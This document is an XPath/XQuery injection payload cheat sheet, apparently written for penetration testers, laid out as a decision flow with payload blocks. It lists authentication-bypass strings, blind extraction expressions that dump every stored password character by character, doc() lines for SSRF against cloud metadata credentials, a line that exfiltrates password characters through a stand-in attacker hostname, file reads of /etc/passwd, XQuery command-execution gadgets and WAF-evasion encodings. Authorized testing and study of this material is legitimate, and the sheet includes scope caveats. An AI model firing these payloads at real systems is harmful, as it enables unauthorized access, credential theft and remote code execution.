# XPath / XQuery Injection — Attack Arsenal

**Author:** x8bitranjit
Payloads, functions, and tools for the guide. Authorized targets only. Baseline every probe against a control. Remember: **XPath 1.0 has no comments** — balance the trailing quote.

---

## §0.0 — The whole attack in one sequence

*What & when:* the entire XPath run on one screen — the **decision spine** every section below plugs into. XPath injection is "SQLi/LDAP for XML" with two defining twists: **no comment syntax** (balance quotes, don't truncate) and **no access control** (one injectable field dumps the *whole* document). Detect → bypass auth → dump the store → fingerprint the version to pick the escalation ceiling. Follow the arrows to the matching section.

```
# ── 1. RECON: where is XPath? (guide §1) ─────────────────────────────────
XML-based login · native XML DB (eXist/BaseX/MarkLogic/Sedna) · SAML NameID · XML config/catalog · SOAP/XSLT

# ── 2. DETECT: quote-break then BOOLEAN differential (guide §2) ──────────
x'                    → error? (a LEAD)      |   ' or '1'='2  (control, false)  vs  ' or '1'='1  (changes) = INJECTION
#   NO COMMENTS (§2.3): keep the expression BALANCED — leave a trailing quote/`or ''='` to pair with the app's close

# ── 3. AUTH BYPASS (guide §3) — the flagship ─────────────────────────────
' or '1'='1' or ''='            → predicate always true → land as FIRST user (no password)
' or name='admin' or ''='       → land as ADMIN specifically      AUTH BYPASS (Critical, CWE-643→287)

# ── 4. BLIND-DUMP the WHOLE store (guide §4) — no ACL = everything ────────
count(//user)=N · string-length(//user[1]/password)=L · substring(//user[i]/password,pos,1)>'m'  (binary-search)
→ char-by-char over every node/attribute → ALL usernames + hashes/tokens   (SAFE-PoC: own record + redact, STOP)

# ── 5. FINGERPRINT version → escalation ceiling (guide §1.2, §5) ─────────
doc('http://oob')  works → XPath 2.0+  → doc('http://169.254.169.254/…') = SSRF→cloud creds
unparsed-text('/etc/passwd') → FILE READ    |    native XML DB → XQuery: BaseX proc:system('id') / eXist util:eval = RCE

# ── 6. PROVE benign, then STOP (guide §7.3) ──────────────────────────────
auth bypass = test account · dump = own record redacted · doc()/file = own OOB/benign file · XQuery = one `id` then STOP
```

> **Cash-out map (guide §7.2 severity):** boolean oracle → **auth bypass** (admin, no password = Critical) · same oracle → **full XML-store blind dump** (all creds, Critical/High — because XML has no per-node ACL) · XPath 2.0 `doc()` → **SSRF→cloud metadata** (High/Crit) · `unparsed-text()` → **file read** (High) · native XML DB XQuery → **RCE** (Critical, CWE-652). A lone `'`-error with no boolean diff = **not a finding** (guide §7.1). Full worked run: **guide Appendix A**.

---

## 0. Function cheat (your extraction toolkit)
> **What & when:** your vocabulary for asking the cabinet questions. `substring`/`string-length`/`count` are the 20-questions tools that work on *any* version (the blind-dump engine); `doc()`/`unparsed-text()`/`string-to-codepoints()` only exist in XPath **2.0/3.0** and unlock SSRF, file read, and faster binary-search extraction — which is why fingerprinting the version (below) decides your ceiling.

| Function | Use |
|----------|-----|
| `substring(s, start, len)` | char-by-char extraction (1-indexed) |
| `string-length(s)` | value length discovery |
| `count(nodeset)` | number of nodes (records/fields) |
| `contains(s, sub)` / `starts-with(s, p)` | coarse matching |
| `name()` / `local-name()` | element name discovery (structure) |
| `position()` / `last()` | node navigation |
| `concat()` / `translate()` / `normalize-space()` | building/normalizing strings |
| `string-to-codepoints()` (2.0) | binary-search a character by codepoint |
| `doc()` / `document()` (2.0) | fetch a URL → **SSRF/OOB** |
| `unparsed-text()` (2.0) | read a local file → **file read** |
| `matches()` / `lower-case()` (2.0) | regex / case-insensitive matching |

---

## 1. Detection — error & boolean
> **What & when:** your first probes — find which quote the app wraps your input in (error probes), then prove you're steering the clerk's logic by comparing an always-true tail against an always-false control. A reliable true≠false difference (not just an error page) is confirmation.

```
# quote/error probes (find the context):
'      "      )      ]      '"      %27      ' or '

# always-TRUE (expect more/all/login-ok):
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or true() or '                # 2.0
1 or 1=1                        # numeric/position context

# always-FALSE (control):
' or '1'='2
' and '1'='2
x' or 1=2 or 'x'='y
```

## 2. Authentication bypass
> **What & when:** the flagship — drop these into the username (and/or password) of an XML-backed login to make the match "anyone" and walk in as the first/admin folder. Match the payload to the quote context you found in §1 (single vs double), and use `admin' or '1'='1` to target the admin node specifically.

```
# single-quote string context (username and/or password):
' or '1'='1
admin' or '1'='1
' or ''='
'or'1'='1
' or 1=1 or ''='
' or position()=1 or '

# double-quote context:
" or "1"="1
" or ""="

# union node-set breakout (widen results / disclose extra nodes):
']|//user|//a['
")]|//user/*|//x[("
' or name()='user' or '
```

## 3. Blind extraction (char-by-char → full dump)
> **What & when:** when you have a yes/no oracle but can't see data — the 20-questions engine that reads the whole cabinet. Count records, find each value's length, then walk character-by-character across every field of every folder. Let `poc/xpath_blind.py` grind it (binary search on 2.0 cuts the questions ~in half).

```
# how many records / fields:
' or count(//user)=5 or 'x'='y
' or count(//user[1]/*)=4 or 'x'='y

# length of a value:
' or string-length((//user[1]/password))=32 or 'x'='y

# character at position i (iterate charset, then position, then record index):
' or substring((//user[1]/password),1,1)='a' or 'x'='y
' or substring((//user[1]/username),1,1)='a' or 'x'='y

# codepoint binary-search (2.0, fewer requests):
' or string-to-codepoints(substring((//user[1]/password),1,1))[1]>109 or 'x'='y

# element-name discovery (structure):
' or substring(name(//user[1]/*[2]),1,1)='p' or 'x'='y

# attributes / positional navigation:
//user[1]/@id
//user[position()=1]/child::node()[position()=2]
```
Loop: position 1..string-length, charset per position, then `//user[2]`, `//user[3]`, … to dump every record. Use `poc/xpath_blind.py`.

## 4. Error-based (when errors are verbose)
```
# force a type/eval error that echoes the selected value (engine-specific):
' or extractvalue-style / cast node-set into an erroring context
' and count(//user/password)=1 and string-length((//user[1]/password))>0 and error occurs
```

## 5. XPath 2.0/3.0 — SSRF, OOB, file read
> **What & when:** only if fingerprinting showed 2.0/3.0. `doc()` makes the server fetch a URL → SSRF (aim at cloud metadata) or a blind phone-home oracle (and you can smuggle stolen characters out through the hostname); `unparsed-text()` reads a local file as text. These lift the ceiling from "read the XML" to "reach internal services / read the filesystem."

```
# SSRF / OOB oracle (server fetches the URL):
' or doc('http://YOUR-OOB/x') or '
doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/')     # cloud metadata

# blind exfil via OOB hostname (put the stolen char in the DNS/host):
' or doc(concat('http://', substring((//user[1]/password),1,1), '.YOUR-OOB/')) or '

# arbitrary file read:
' or unparsed-text('file:///etc/passwd')
unparsed-text('file:///c:/windows/win.ini')
```

## 6. XQuery injection → RCE (native XML DBs — match the engine)
> **What & when:** the top of the ceiling — only on native XML databases (BaseX/MarkLogic/eXist-db/Sedna) whose XQuery layer exposes command-running extension functions. Fingerprint the exact engine first (each has different function names), then fire one benign `id` to prove RCE and stop.

```
# BaseX:
'] , proc:system('id') , ('
# MarkLogic:
'] , xdmp:spawn(...) / xdmp:document-load('http://...') , ('
# eXist-db:
'] , util:eval("...") / file:read(...) , ('
# generic FLWOR pivot:
' return doc('...') (: ...
```
Engine-specific; confirm the XML DB first, then use its extension-function catalog.

## 7. WAF / filter bypass
> **What & when:** when the injection clearly works but a filter/WAF blocks the obvious payload — route around the specific block. Strip spaces (`'or'1'='1`), flip case, url/entity-encode, or build blocked strings with `concat()`/`translate()` so the literal never appears.

```
'or'1'='1                       # remove spaces
' oR '1'='1                     # case
' or&#x20;'1'='1                # entity/encoding
' or '1'='1'                    # extra balance
concat('a','b')                 # avoid literal strings the filter blocks
translate('X','X','x')          # transform chars
%27%20or%20%271%27%3d%271       # url-encode
```

## 8. Tools

| Tool | Use |
|------|-----|
| **xcat** (`pip install xcat`) | The reference XPath-injection tool: auto blind extraction + OOB via `doc()` + file read; supports 1.0/2.0 |
| **Burp Suite** (Repeater/Intruder) | Manual boolean differential, quote-context discovery, charset iteration |
| **`poc/xpath_fuzz.py`** | Control-baselined detection + auth-bypass tester (single/double quote), low-FP |
| **`poc/xpath_blind.py`** | Blind `count`/`string-length`/`substring` char-by-char extractor (binary-search) |
| **Interactsh / your OOB** | `doc()` SSRF/OOB confirmation + blind exfil channel |
| local **BaseX / eXist-db** | Reproduce XQuery gadgets safely before firing on target |

## 9. xcat quick-start
```
xcat run <URL> <injectable_param> <other_params> --true-string="Welcome"   # inject + auto-extract
xcat run http://t/login username password --true-string="logged in" \
     -m POST -b username=admin -b password=x                              # POST body
# with OOB for speed / blind:  xcat --oob-ip YOUR-IP run ...
```

> Baseline every probe. A finding = a **steered, repeatable** change (login without password / data out / file read / code run) — not a lone error. Own/test accounts, one benign proof, redact secrets. Authorized targets only.
